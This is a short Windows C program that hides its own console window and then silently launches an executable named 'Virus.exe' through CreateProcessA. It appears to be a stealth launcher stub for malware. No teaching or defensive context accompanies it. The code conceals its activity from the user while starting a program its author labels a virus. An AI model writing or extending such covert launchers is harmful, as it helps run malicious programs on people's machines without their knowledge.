#include <windows.h>


int main(void)
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	STARTUPINFOA info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	CreateProcessA(NULL, (LPSTR)"Virus.exe", NULL, NULL, TRUE, 0,NULL, NULL, &info, &processInfo);
	//system("pause");
}
